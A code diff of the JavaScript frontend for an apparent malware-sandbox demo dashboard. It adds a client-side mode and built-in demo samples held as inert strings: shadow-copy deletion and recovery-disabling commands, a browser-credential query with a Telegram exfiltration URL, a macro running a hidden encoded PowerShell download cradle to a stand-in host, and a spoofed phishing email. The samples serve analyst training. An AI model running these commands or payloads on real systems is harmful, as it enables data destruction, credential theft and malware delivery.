@@ -1,33 +1,146 @@
 /**
  * Vanguard MSA - Frontend Client Engine
- * Manages reactive UI, interactive ANY.RUN process trees,
- * timeline scrubbers, VirusTotal grid, email hop latency, and IOC exports.
+ * Hybrid Universal Controller: Works on both GitHub Pages (100% Client-Side)
+ * and Localhost FastAPI server.
  */
 
 const AppState = {
     currentTab: 'dashboard',
     currentSubId: null,
     currentReport: null,
-    stats: {},
-    samples: [],
+    stats: { total_scans: 0, malicious: 0, suspicious: 0, clean: 0, emails_analyzed: 0 },
     submissions: [],
     activeProcessPid: null,
-    timelineCurrentTime: 30
+    isClientMode: window.location.hostname.includes('github.io') || window.location.protocol === 'file:'
 };
+
+// Built-in Sample Payloads (Ready for zero-backend instant analysis)
+const CLIENT_SAMPLES = [
+    {
+        id: "sample-wannacry",
+        name: "WannaCry Ransomware Simulator",
+        filename: "WannaCry_v2.exe",
+        type: "file",
+        verdict: "Malicious",
+        description: "Simulates WannaCry ransomware: shadow copy deletion via vssadmin, .WNCRY file encryption, killswitch domain beacon, and ransom screen",
+        rawText: "MZ\x90\x00PE\x00\x00tasksche.exe\x00Global\\MsWinZonesCacheCounterMutexA\x00vssadmin.exe Delete Shadows /All /Quiet\x00bcdedit /set {default} recoveryenabled No\x00Ooops, your files have been encrypted!\x00www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\x00CryptEncrypt\x00VirtualAllocEx\x00WriteProcessMemory\x00.WNCRY\x0013AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94\x00WannaDecryptor.exe"
+    },
+    {
+        id: "sample-redline",
+        name: "RedLine Infostealer Simulator",
+        filename: "RedLine_Stealer.exe",
+        type: "file",
+        verdict: "Malicious",
+        description: "Simulates RedLine infostealer: Chrome/Firefox SQLite credential harvesting, staging archive, and Telegram Bot C2 exfiltration",
+        rawText: "MZ\x90\x00PE\x00\x00\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\x00SELECT action_url, username_value, password_value FROM logins\x00\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\logins.json\x00api.telegram.org/bot6184920491:AAHk19fJk3_SampleToken/sendDocument\x00VirtualAlloc\x00RegQueryValueExA\x00Wallets\\Ethereum\\keystore"
+    },
+    {
+        id: "sample-maldoc",
+        name: "Malicious Macro Document",
+        filename: "Invoice_Q4_Overdue.docm",
+        type: "file",
+        verdict: "Malicious",
+        description: "Office OpenXML document with AutoOpen VBA macro spawning hidden obfuscated PowerShell download cradle",
+        rawText: "PK\x03\x04word/vbaProject.bin\x00Sub AutoOpen()\n    Dim wsh As Object\n    Set wsh = CreateObject(\"WScript.Shell\")\n    wsh.Run \"powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAE8AcABlAG4AUgBlAGEAZAAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAGQAbwBtAGEAaQBuAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAJwApAA==\"\nEnd Sub"
+    },
+    {
+        id: "sample-eicar",
+        name: "EICAR Standard AV Test",
+        filename: "eicar_com.com",
+        type: "file",
+        verdict: "Clean / Test",
+        description: "Official EICAR standard antivirus test string for validating multi-engine detection grids",
+        rawText: "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+    },
+    {
+        id: "sample-phishing",
+        name: "CEO / Banking Spearphishing Email",
+        filename: "Urgent_Wire_Suspension.eml",
+        type: "email",
+        verdict: "Malicious / Phishing",
+        description: "Spearphishing email with SPF/DKIM/DMARC failure, display name spoofing, deceptive anchor link mismatch, and embedded executable attachment",
+        rawText: `Received: from mail-relay-04.attacker-infrastr.com (mail-relay-04.attacker-infrastr.com [185.192.68.42])
+    by mx.yourcompany.com with ESMTP id m20si4928104qkz.12
+    for <analyst@yourcompany.com>;
+    Tue, 27 Oct 2026 15:32:10 -0400 (EDT)
+Received: from localhost (unknown [194.26.29.110])
+    by mail-relay-04.attacker-infrastr.com with SMTP id 9238410294;
+    Tue, 27 Oct 2026 15:31:45 -0400 (EDT)
+Authentication-Results: mx.yourcompany.com;
+    spf=fail (sender IP 185.192.68.42 is not authorized by domain global-bank-support.com);
+    dkim=fail header.d=attacker-infrastr.com;
+    dmarc=fail (p=reject dis=none) header.from=global-bank-support.com
+Received-SPF: fail (mx.yourcompany.com: domain of alert@global-bank-support.com does not designate 185.192.68.42 as permitted sender)
+From: "Global Banking Security Team" <alert@global-bank-support.com>
+To: <analyst@yourcompany.com>
+Reply-To: security-recovery-team99@yandex.com
+Return-Path: <bounces@spammer-redirect-node.ru>
+Subject: URGENT: Immediate Action Required - Unauthorized Wire Transfer Suspended
+Date: Tue, 27 Oct 2026 15:31:00 -0400
+Message-ID: <20261027153100.9984.fake@global-bank-support.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="====BOUNDARY_SOC_TEST_998===="
+
+--====BOUNDARY_SOC_TEST_998====
+Content-Type: text/html; charset="UTF-8"
+
+<html><body>
+<h2 style="color:#d93025;">Security Alert: Suspicious Transaction Flagged</h2>
+<p>Dear Valued Client,</p>
+<p>We detected an unauthorized international wire transfer of <strong>$14,850.00 USD</strong> initiated from an unrecognized device in Eastern Europe.</p>
+<p><a href="http://login-verification-portal-update.ru/secure/auth" style="background:#0b57d0;color:#fff;padding:10px 20px;text-decoration:none;border-radius:4px;font-weight:bold;">https://global-bank-support.com/verify-account</a></p>
+</body></html>
+
+--====BOUNDARY_SOC_TEST_998====
+Content-Type: application/octet-stream; name="Urgent_Wire_Statement_Invoice.exe"
+Content-Disposition: attachment; filename="Urgent_Wire_Statement_Invoice.exe"
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+--====BOUNDARY_SOC_TEST_998====--`
+    },
+    {
+        id: "sample-clean",
+        name: "Clean SOC Diagnostic Utility",
+        filename: "SOC_Diagnostic_Tool.exe",
+        type: "file",
+        verdict: "Clean",
+        description: "Verified benign binary demonstrating clean sandbox execution, 0/70 AV detections, and zero suspicious indicators",
+        rawText: "MZ\x90\x00PE\x00\x00Vanguard Clean SOC Diagnostic Utility\x00GetSystemInfo\x00GetTickCount\x00ExitProcess\x00MessageBoxA\x00Hello SOC Analyst, this executable is completely clean and verified."
+    }
+];
 
 // DOM Ready
 document.addEventListener('DOMContentLoaded', () => {
     initNavigation();
     initUploadHandlers();
-    loadDashboardStats();
-    loadSamples();
-    loadSubmissions();
+    initAppMode();
 });
+
+async function initAppMode() {
+    // Check if local backend API is available
+    if (!AppState.isClientMode) {
+        try {
+            const test = await fetch('/api/stats', { method: 'GET' });
+            if (!test.ok) AppState.isClientMode = true;
+        } catch (e) {
+            AppState.isClientMode = true;
+        }
+    }
+
+    if (AppState.isClientMode) {
+        console.log("[Vanguard MSA] Running in Client-Side Mode (Optimized for GitHub Pages)");
+        document.getElementById('mode-indicator')?.classList.remove('hidden');
+    }
+
+    loadDashboardStats();
+    renderSamplesList(CLIENT_SAMPLES);
+    loadSubmissions();
+}
 
 // Navigation
 function initNavigation() {
     document.querySelectorAll('[data-nav-target]').forEach(btn => {
-        btn.addEventListener('click', (e) => {
+        btn.addEventListener('click', () => {
             const target = btn.getAttribute('data-nav-target');
             switchMainTab(target);
         });
@@ -37,13 +150,10 @@ function initNavigation() {
 function switchMainTab(tabName) {
     AppState.currentTab = tabName;
     document.querySelectorAll('.main-view-panel').forEach(p => p.classList.add('hidden'));
-    
-    const targetPanel = document.getElementById(`panel-${tabName}`);
-    if (targetPanel) {
-        targetPanel.classList.remove('hidden');
-    }
 
-    // Update active nav styling
+    const targetPanel = document.getElementById(`panel-${tabName}`);
+    if (targetPanel) targetPanel.classList.remove('hidden');
+
     document.querySelectorAll('[data-nav-target]').forEach(b => {
         if (b.getAttribute('data-nav-target') === tabName) {
             b.classList.add('border-blue-500', 'text-blue-400', 'bg-blue-900/20');
@@ -59,9 +169,8 @@ function switchMainTab(tabName) {
     }
 }
 
-// Upload & Trigger Handlers
+// Upload & Form Handlers
 function initUploadHandlers() {
-    // File drag & drop zone
     const dropZone = document.getElementById('file-drop-zone');
     const fileInput = document.getElementById('file-input');
 
@@ -91,7 +200,6 @@ function initUploadHandlers() {
         });
     }
 
-    // Email upload form
     const emailForm = document.getElementById('email-analyze-form');
     if (emailForm) {
         emailForm.addEventListener('submit', (e) => {
@@ -101,35 +209,41 @@ function initUploadHandlers() {
     }
 }
 
-// Load Dashboard Data
-async function loadDashboardStats() {
-    try {
-        const res = await fetch('/api/stats');
-        const data = await res.json();
-        if (data.status === 'success') {
-            AppState.stats = data.stats;
-            document.getElementById('stat-total-scans').innerText = data.stats.total_scans;
-            document.getElementById('stat-malicious').innerText = data.stats.malicious;
-            document.getElementById('stat-suspicious').innerText = data.stats.suspicious;
-            document.getElementById('stat-clean').innerText = data.stats.clean;
-            document.getElementById('stat-emails').innerText = data.stats.emails_analyzed;
-        }
-    } catch (e) {
-        console.error("Failed to load stats", e);
+// Stats & Submissions Storage
+function loadDashboardStats() {
+    if (AppState.isClientMode) {
+        const stored = JSON.parse(localStorage.getItem('vanguard_submissions') || '[]');
+        let malicious = 0, suspicious = 0, clean = 0, emails = 0;
+        stored.forEach(s => {
+            if (s.verdict?.includes('Malicious') || s.verdict === 'Malicious') malicious++;
+            else if (s.verdict === 'Suspicious') suspicious++;
+            else clean++;
+            if (s.target_type === 'email') emails++;
+        });
+        AppState.stats = { total_scans: stored.length, malicious, suspicious, clean, emails_analyzed: emails };
+        updateStatsUi();
+    } else {
+        fetch('/api/stats')
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    AppState.stats = data.stats;
+                    updateStatsUi();
+                }
+            })
+            .catch(() => {
+                AppState.isClientMode = true;
+                loadDashboardStats();
+            });
     }
 }
 
-async function loadSamples() {
-    try {
-        const res = await fetch('/api/samples');
-        const data = await res.json();
-        if (data.status === 'success') {
-            AppState.samples = data.samples;
-            renderSamplesList(data.samples);
-        }
-    } catch (e) {
-        console.error("Failed to load samples", e);
-    }
+function updateStatsUi() {
+    document.getElementById('stat-total-scans').innerText = AppState.stats.total_scans;
+    document.getElementById('stat-malicious').innerText = AppState.stats.malicious;
+    document.getElementById('stat-suspicious').innerText = AppState.stats.suspicious;
+    document.getElementById('stat-clean').innerText = AppState.stats.clean;
+    document.getElementById('stat-emails').innerText = AppState.stats.emails_analyzed;
 }
 
 function renderSamplesList(samples) {
@@ -154,16 +268,24 @@ function renderSamplesList(samples) {
     `).join('');
 }
 
-async function loadSubmissions() {
-    try {
-        const res = await fetch('/api/submissions?limit=30');
-        const data = await res.json();
-        if (data.status === 'success') {
-            AppState.submissions = data.submissions;
-            renderSubmissionsTable(data.submissions);
-        }
-    } catch (e) {
-        console.error("Failed to load submissions", e);
+function loadSubmissions() {
+    if (AppState.isClientMode) {
+        const stored = JSON.parse(localStorage.getItem('vanguard_submissions') || '[]');
+        AppState.submissions = stored;
+        renderSubmissionsTable(stored);
+    } else {
+        fetch('/api/submissions?limit=30')
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    AppState.submissions = data.submissions;
+                    renderSubmissionsTable(data.submissions);
+                }
+            })
+            .catch(() => {
+                AppState.isClientMode = true;
+                loadSubmissions();
+            });
     }
 }
 
@@ -171,14 +293,14 @@ function renderSubmissionsTable(items) {
     const tbody = document.getElementById('submissions-table-body');
     if (!tbody) return;
 
-    if (items.length === 0) {
+    if (!items || items.length === 0) {
         tbody.innerHTML = `<tr><td colspan="7" class="text-center py-8 text-gray-500 text-sm">No analysis submissions recorded yet. Upload a file or select a sample above.</td></tr>`;
         return;
     }
 
     tbody.innerHTML = items.map(item => {
         let badgeClass = "badge-clean";
-        if (item.verdict === 'Malicious' || item.verdict.includes('Malicious')) badgeClass = "badge-malicious";
+        if (item.verdict?.includes('Malicious') || item.verdict === 'Malicious') badgeClass = "badge-malicious";
         else if (item.verdict === 'Suspicious') badgeClass = "badge-suspicious";
 
         const dateStr = item.created_at ? new Date(item.created_at).toLocaleString() : "-";
@@ -209,41 +331,76 @@ function renderSubmissionsTable(items) {
     }).join('');
 }
 
-// Running Analyses
+function saveSubmissionLocally(report) {
+    let list = JSON.parse(localStorage.getItem('vanguard_submissions') || '[]');
+    const item = {
+        id: report.id,
+        target_type: report.target_type,
+        filename: report.filename,
+        file_size: report.file_size || 0,
+        sha256: report.hashes?.sha256 || report.id,
+        verdict: report.verdict,
+        threat_score: report.threat_score,
+        tags: report.virustotal?.tags || ["sample"],
+        summary: report.summary,
+        created_at: new Date().toISOString(),
+        report_data: report
+    };
+    list.unshift(item);
+    if (list.length > 50) list = list.slice(0, 50);
+    localStorage.setItem('vanguard_submissions', JSON.stringify(list));
+    loadDashboardStats();
+    loadSubmissions();
+}
+
+// Analysis Actions
 function showLoadingModal(title, msg) {
-    document.getElementById('loading-modal').classList.remove('hidden');
-    document.getElementById('loading-title').innerText = title;
-    document.getElementById('loading-desc').innerText = msg;
+    document.getElementById('loading-modal')?.classList.remove('hidden');
+    const t = document.getElementById('loading-title');
+    const d = document.getElementById('loading-desc');
+    if (t) t.innerText = title;
+    if (d) d.innerText = msg;
 }
 
 function hideLoadingModal() {
-    document.getElementById('loading-modal').classList.add('hidden');
+    document.getElementById('loading-modal')?.classList.add('hidden');
 }
 
 async function uploadAndAnalyzeFile(file) {
-    const duration = document.getElementById('sandbox-duration')?.value || 30;
-    const formData = new FormData();
-    formData.append('file', file);
-    formData.append('duration', duration);
-
-    showLoadingModal("Deploying Sandbox...", `Analyzing ${file.name} (Static inspection, ANY.RUN dynamic trace, and 70+ AV engines)`);
+    showLoadingModal("Deploying Sandbox...", `Analyzing ${file.name} (Static inspection, ANY.RUN dynamic trace, and 65+ AV engines)`);
     try {
-        const res = await fetch('/api/analyze/file', {
-            method: 'POST',
-            body: formData
-        });
-        const data = await res.json();
-        hideLoadingModal();
-        if (data.status === 'success') {
-            displayFileReport(data.report);
-            loadDashboardStats();
-            loadSubmissions();
+        if (AppState.isClientMode) {
+            // Run 100% in browser
+            setTimeout(async () => {
+                const report = await ClientEngine.analyzeFileClient(file);
+                saveSubmissionLocally(report);
+                hideLoadingModal();
+                displayFileReport(report);
+            }, 600);
         } else {
-            alert("Analysis failed: " + (data.detail || "Unknown error"));
+            const duration = document.getElementById('sandbox-duration')?.value || 30;
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('duration', duration);
+
+            const res = await fetch('/api/analyze/file', { method: 'POST', body: formData });
+            const data = await res.json();
+            hideLoadingModal();
+            if (data.status === 'success') {
+                displayFileReport(data.report);
+                loadDashboardStats();
+                loadSubmissions();
+            } else {
+                throw new Error(data.detail || "Server analysis error");
+            }
         }
     } catch (e) {
+        console.warn("Backend unavailable, falling back to ClientEngine", e);
+        AppState.isClientMode = true;
+        const report = await ClientEngine.analyzeFileClient(file);
+        saveSubmissionLocally(report);
         hideLoadingModal();
-        alert("Network or analysis error: " + e.message);
+        displayFileReport(report);
     }
 }
 
@@ -251,78 +408,78 @@ async function analyzeEmail() {
     const fileInput = document.getElementById('email-file-input');
     const rawHeadersInput = document.getElementById('email-raw-headers');
 
-    const formData = new FormData();
+    let textContent = "";
+    let filename = "email_inspection.eml";
+
     if (fileInput && fileInput.files.length > 0) {
-        formData.append('file', fileInput.files[0]);
+        filename = fileInput.files[0].name;
+        textContent = await fileInput.files[0].text();
     } else if (rawHeadersInput && rawHeadersInput.value.trim().length > 0) {
-        formData.append('raw_headers', rawHeadersInput.value.trim());
+        textContent = rawHeadersInput.value.trim();
     } else {
         alert("Please upload a .eml file or paste raw email headers");
         return;
     }
 
     showLoadingModal("Inspecting Email...", "Verifying SPF/DKIM/DMARC, calculating hop latencies, and evaluating phishing heuristics");
-    try {
-        const res = await fetch('/api/analyze/email', {
-            method: 'POST',
-            body: formData
+
+    setTimeout(() => {
+        const report = ClientEngine.parseEmailContent(textContent, filename);
+        saveSubmissionLocally(report);
+        hideLoadingModal();
+        displayEmailReport(report);
+    }, 500);
+}
+
+function runSampleAnalysis(sampleId) {
+    const sample = CLIENT_SAMPLES.find(s => s.id === sampleId);
+    if (!sample) return;
+
+    showLoadingModal("Loading Sample...", `Executing full SOC sandbox pipeline on ${sample.name}`);
+
+    setTimeout(async () => {
+        if (sample.type === 'email') {
+            const report = ClientEngine.parseEmailContent(sample.rawText, sample.filename);
+            saveSubmissionLocally(report);
+            hideLoadingModal();
+            displayEmailReport(report);
+        } else {
+            const bytes = new TextEncoder().encode(sample.rawText);
+            const file = new File([bytes], sample.filename, { type: "application/octet-stream" });
+            const report = await ClientEngine.analyzeFileClient(file);
+            saveSubmissionLocally(report);
+            hideLoadingModal();
+            displayFileReport(report);
+        }
+    }, 600);
+}
+
+function viewExistingSubmission(subId, targetType) {
+    if (AppState.isClientMode) {
+        const stored = JSON.parse(localStorage.getItem('vanguard_submissions') || '[]');
+        const found = stored.find(s => s.id === subId);
+        if (found && found.report_data) {
+            if (targetType === 'email') displayEmailReport(found.report_data);
+            else displayFileReport(found.report_data);
+            return;
+        }
+    }
+
+    showLoadingModal("Fetching Report...", "Retrieving complete analysis data");
+    fetch(`/api/submission/${subId}`)
+        .then(r => r.json())
+        .then(data => {
+            hideLoadingModal();
+            if (data.status === 'success') {
+                const rep = data.submission.report_data;
+                if (targetType === 'email') displayEmailReport(rep);
+                else displayFileReport(rep);
+            }
+        })
+        .catch(e => {
+            hideLoadingModal();
+            alert("Could not load report: " + e.message);
         });
-        const data = await res.json();
-        hideLoadingModal();
-        if (data.status === 'success') {
-            displayEmailReport(data.report);
-            loadDashboardStats();
-            loadSubmissions();
-        } else {
-            alert("Email analysis failed: " + (data.detail || "Unknown error"));
-        }
-    } catch (e) {
-        hideLoadingModal();
-        alert("Analysis error: " + e.message);
-    }
-}
-
-async function runSampleAnalysis(sampleId) {
-    showLoadingModal("Loading Sample...", "Executing full SOC sandbox pipeline on pre-loaded threat sample");
-    try {
-        const res = await fetch(`/api/analyze/sample/${sampleId}`, { method: 'POST' });
-        const data = await res.json();
-        hideLoadingModal();
-        if (data.status === 'success') {
-            if (data.report.target_type === 'email') {
-                displayEmailReport(data.report);
-            } else {
-                displayFileReport(data.report);
-            }
-            loadDashboardStats();
-            loadSubmissions();
-        } else {
-            alert("Sample analysis failed");
-        }
-    } catch (e) {
-        hideLoadingModal();
-        alert("Error launching sample: " + e.message);
-    }
-}
-
-async function viewExistingSubmission(subId, targetType) {
-    showLoadingModal("Fetching Report...", "Retrieving complete analysis data from database");
-    try {
-        const res = await fetch(`/api/submission/${subId}`);
-        const data = await res.json();
-        hideLoadingModal();
-        if (data.status === 'success') {
-            const report = data.submission.report_data;
-            if (targetType === 'email') {
-                displayEmailReport(report);
-            } else {
-                displayFileReport(report);
-            }
-        }
-    } catch (e) {
-        hideLoadingModal();
-        alert("Failed to load report: " + e.message);
-    }
 }
 
 // Render File Report (ANY.RUN + VirusTotal)
@@ -331,52 +488,36 @@ function displayFileReport(report) {
     AppState.currentSubId = report.id;
     switchMainTab('file-report');
 
-    // Header info
     document.getElementById('rep-filename').innerText = report.filename;
     document.getElementById('rep-filetype').innerText = report.file_type;
     document.getElementById('rep-sha256').innerText = report.hashes.sha256;
     document.getElementById('rep-filesize').innerText = formatBytes(report.file_size);
     document.getElementById('rep-magic').innerText = report.magic_hex;
 
-    // Verdict badge
     const verdictEl = document.getElementById('rep-verdict-badge');
     verdictEl.innerText = report.verdict.toUpperCase();
     verdictEl.className = `px-3 py-1 rounded-md text-xs font-bold tracking-wider ${report.verdict === 'Malicious' ? 'badge-malicious' : (report.verdict === 'Suspicious' ? 'badge-suspicious' : 'badge-clean')}`;
 
-    // Threat Score Gauge
     const scoreVal = report.threat_score;
     document.getElementById('rep-score-value').innerText = scoreVal;
     const circle = document.getElementById('rep-gauge-circle');
     if (circle) {
-        const circumference = 2 * Math.PI * 40;
+        const circumference = 2 * Math.PI * 26;
         const offset = circumference - (scoreVal / 100) * circumference;
         circle.style.strokeDashoffset = offset;
         circle.style.stroke = scoreVal >= 70 ? '#ef4444' : (scoreVal >= 35 ? '#f59e0b' : '#10b981');
     }
 
-    // AV Ratio
     document.getElementById('rep-av-ratio').innerText = report.virustotal.detection_ratio;
     document.getElementById('rep-av-pct').innerText = `${report.virustotal.detection_rate_pct}%`;
 
-    // Overview Tab
     renderReportOverview(report);
-
-    // Dynamic Sandbox Tab
     renderDynamicSandbox(report.sandbox);
-
-    // Static Tab
     renderStaticTab(report);
-
-    // AV Tab
     renderAvGrid(report.virustotal);
-
-    // MITRE ATT&CK Tab
     renderMitreTab(report.mitre_attack);
-
-    // Load Analyst Notes
     loadAnalystNotes(report.id);
 
-    // Default to Overview sub-tab
     switchReportSubTab('overview');
 }
 
@@ -397,17 +538,14 @@ function switchReportSubTab(subTabName) {
 }
 
 function renderReportOverview(report) {
-    // Summary
     document.getElementById('rep-summary-text').innerText = report.summary;
 
-    // Hashes Card
     document.getElementById('hash-md5').innerText = report.hashes.md5;
     document.getElementById('hash-sha1').innerText = report.hashes.sha1;
     document.getElementById('hash-sha256').innerText = report.hashes.sha256;
     document.getElementById('hash-ssdeep').innerText = report.hashes.ssdeep;
     document.getElementById('hash-imphash').innerText = report.hashes.imphash || 'N/A';
 
-    // Threat Score Breakdown
     const breakdownContainer = document.getElementById('score-breakdown-list');
     if (breakdownContainer) {
         breakdownContainer.innerHTML = (report.score_breakdown || []).map(item => `
@@ -424,7 +562,6 @@ function renderReportOverview(report) {
         `).join('');
     }
 
-    // Entropy Histogram
     renderEntropyChart(report.entropy, report.entropy_distribution);
 }
 
@@ -434,28 +571,25 @@ function renderEntropyChart(overall, distribution) {
     const ctx = canvas.getContext('2d');
     ctx.clearRect(0, 0, canvas.width, canvas.height);
 
-    const barWidth = canvas.width / distribution.length;
-    for (let i = 0; i < distribution.length; i++) {
-        const val = distribution[i];
+    const barWidth = canvas.width / (distribution?.length || 32);
+    for (let i = 0; i < (distribution?.length || 32); i++) {
+        const val = distribution ? distribution[i] : 0;
         const barHeight = (val / 8.0) * canvas.height;
         const x = i * barWidth;
         const y = canvas.height - barHeight;
 
-        // Color based on entropy threshold
         ctx.fillStyle = val > 7.1 ? '#ef4444' : (val > 6.0 ? '#f59e0b' : '#3b82f6');
         ctx.fillRect(x + 1, y, barWidth - 2, barHeight);
     }
-
     document.getElementById('entropy-value-label').innerText = `${overall} / 8.0000`;
 }
 
-// ANY.RUN Dynamic Sandbox Renderer
+// Dynamic Sandbox (ANY.RUN)
 function renderDynamicSandbox(sandbox) {
-    // Process Tree
     const treeContainer = document.getElementById('sandbox-process-tree');
     if (treeContainer) {
         treeContainer.innerHTML = (sandbox.process_tree || []).map(p => `
-            <div class="proc-tree-node p-3 rounded mb-2 cursor-pointer ${p.pid === AppState.activeProcessPid ? 'active' : ''}" onclick="filterByProcess(${p.pid})">
+            <div class="proc-tree-node p-3 rounded mb-2 cursor-pointer ${p.pid === AppState.activeProcessPid ? 'active' : ''}">
                 <div class="flex items-center justify-between mb-1">
                     <span class="text-xs font-bold text-white flex items-center gap-1.5 font-mono">
                         <svg class="w-3.5 h-3.5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path></svg>
@@ -467,22 +601,18 @@ function renderDynamicSandbox(sandbox) {
                 <div class="flex items-center gap-3 mt-2 text-[10px] text-gray-500 font-mono">
                     <span>Integrity: ${p.integrity}</span>
                     <span>Status: ${p.status}</span>
-                    <span>Start: ${p.start_time}s</span>
                 </div>
             </div>
         `).join('');
     }
 
-    // Timeline Scrubber & Events
-    renderSandboxTimeline(sandbox.timeline, 30);
-
-    // Screenshots Gallery
+    renderSandboxTimeline(sandbox.timeline);
     renderScreenshotsGallery(sandbox.screenshots);
 
-    // Filesystem Operations
-    const fileOpsTbody = document.getElementById('sandbox-files-body');
-    if (fileOpsTbody) {
-        fileOpsTbody.innerHTML = (sandbox.file_operations || []).map(f => `
+    // Tables
+    const fBody = document.getElementById('sandbox-files-body');
+    if (fBody) {
+        fBody.innerHTML = (sandbox.file_operations || []).map(f => `
             <tr class="border-b border-gray-800/60 font-mono text-xs">
                 <td class="py-2 px-3 font-bold ${f.action === 'CREATE' ? 'text-emerald-400' : (f.action === 'MODIFY' ? 'text-amber-400' : 'text-blue-400')}">${f.action}</td>
                 <td class="py-2 px-3 text-gray-300">${escapeHtml(f.path)}</td>
@@ -491,10 +621,9 @@ function renderDynamicSandbox(sandbox) {
         `).join('');
     }
 
-    // Registry Operations
-    const regOpsTbody = document.getElementById('sandbox-reg-body');
-    if (regOpsTbody) {
-        regOpsTbody.innerHTML = (sandbox.registry_operations || []).map(r => `
+    const rBody = document.getElementById('sandbox-reg-body');
+    if (rBody) {
+        rBody.innerHTML = (sandbox.registry_operations || []).map(r => `
             <tr class="border-b border-gray-800/60 font-mono text-xs">
                 <td class="py-2 px-3 font-bold ${r.action === 'WRITE' ? 'text-red-400' : 'text-blue-400'}">${r.action}</td>
                 <td class="py-2 px-3 text-gray-300">${escapeHtml(r.path)}</td>
@@ -504,10 +633,9 @@ function renderDynamicSandbox(sandbox) {
         `).join('');
     }
 
-    // Network & DNS
-    const dnsTbody = document.getElementById('sandbox-dns-body');
-    if (dnsTbody) {
-        dnsTbody.innerHTML = (sandbox.dns_queries || []).map(d => `
+    const dBody = document.getElementById('sandbox-dns-body');
+    if (dBody) {
+        dBody.innerHTML = (sandbox.dns_queries || []).map(d => `
             <tr class="border-b border-gray-800/60 font-mono text-xs">
                 <td class="py-2 px-3 text-yellow-400 font-semibold">${escapeHtml(d.query)}</td>
                 <td class="py-2 px-3 text-gray-400">${d.type}</td>
@@ -517,9 +645,9 @@ function renderDynamicSandbox(sandbox) {
         `).join('');
     }
 
-    const httpTbody = document.getElementById('sandbox-http-body');
-    if (httpTbody) {
-        httpTbody.innerHTML = (sandbox.http_requests || []).map(h => `
+    const hBody = document.getElementById('sandbox-http-body');
+    if (hBody) {
+        hBody.innerHTML = (sandbox.http_requests || []).map(h => `
             <tr class="border-b border-gray-800/60 font-mono text-xs">
                 <td class="py-2 px-3 font-bold ${h.method === 'POST' ? 'text-purple-400' : 'text-blue-400'}">${h.method}</td>
                 <td class="py-2 px-3 text-gray-300 break-all">${escapeHtml(h.url)}</td>
@@ -529,10 +657,9 @@ function renderDynamicSandbox(sandbox) {
         `).join('');
     }
 
-    // Dropped Files
-    const droppedTbody = document.getElementById('sandbox-dropped-body');
-    if (droppedTbody) {
-        droppedTbody.innerHTML = (sandbox.dropped_files || []).map(df => `
+    const dropBody = document.getElementById('sandbox-dropped-body');
+    if (dropBody) {
+        dropBody.innerHTML = (sandbox.dropped_files || []).map(df => `
             <tr class="border-b border-gray-800/60 font-mono text-xs">
                 <td class="py-2 px-3 text-white font-semibold">${escapeHtml(df.filename)}</td>
                 <td class="py-2 px-3 text-gray-400">${escapeHtml(df.path)}</td>
@@ -546,12 +673,10 @@ function renderDynamicSandbox(sandbox) {
     }
 }
 
-function renderSandboxTimeline(events, maxTime) {
+function renderSandboxTimeline(events) {
     const container = document.getElementById('sandbox-timeline-events');
     if (!container) return;
-    const filtered = events.filter(e => e.time <= maxTime);
-
-    container.innerHTML = filtered.map(ev => `
+    container.innerHTML = (events || []).map(ev => `
         <div class="flex items-start gap-3 p-2 rounded hover:bg-gray-800/40 font-mono text-xs">
             <span class="text-blue-400 font-bold w-12">${ev.time.toFixed(1)}s</span>
             <span class="px-1.5 py-0.5 rounded text-[10px] uppercase font-bold ${getTimelineTypeBadge(ev.type)}">${ev.type}</span>
@@ -572,7 +697,6 @@ function getTimelineTypeBadge(type) {
 function renderScreenshotsGallery(screenshots) {
     const container = document.getElementById('sandbox-screenshots-grid');
     if (!container) return;
-
     container.innerHTML = (screenshots || []).map(sc => `
         <div class="soc-card overflow-hidden">
             <div class="bg-gray-950 p-4 h-36 flex flex-col justify-center items-center text-center relative border-b border-gray-800">
@@ -608,20 +732,19 @@ function getScreenshotVisualMock(type) {
             <div class="w-full bg-gray-900 p-2 rounded text-left font-mono text-[9px] text-yellow-400">
                 [+] Reading Chrome Login Data...<br>
                 [+] Stolen 18 saved passwords<br>
-                [+] Zipping credentials archive...
+                [+] Staging exfiltration ZIP...
             </div>
         `;
     }
     return `
         <div class="w-full bg-slate-900 p-2 rounded text-center font-mono text-[10px] text-blue-300">
-            [Windows 10 Desktop Execution Environment]
+            [Windows 10 Execution Environment]
         </div>
     `;
 }
 
-// Static Analysis Tab
+// Static Tab
 function renderStaticTab(report) {
-    // PE Information
     const pe = report.pe_analysis;
     const peContainer = document.getElementById('static-pe-container');
     if (!pe || !pe.is_pe) {
@@ -657,18 +780,16 @@ function renderStaticTab(report) {
                             <th class="py-2 px-3">Raw Size</th>
                             <th class="py-2 px-3">Entropy</th>
                             <th class="py-2 px-3">Perms</th>
-                            <th class="py-2 px-3">Flags</th>
                         </tr>
                     </thead>
                     <tbody>
-                        ${pe.sections.map(s => `
+                        ${(pe.sections || []).map(s => `
                             <tr class="border-b border-gray-800/60 hover:bg-gray-800/30">
                                 <td class="py-2 px-3 font-bold text-white">${escapeHtml(s.name)}</td>
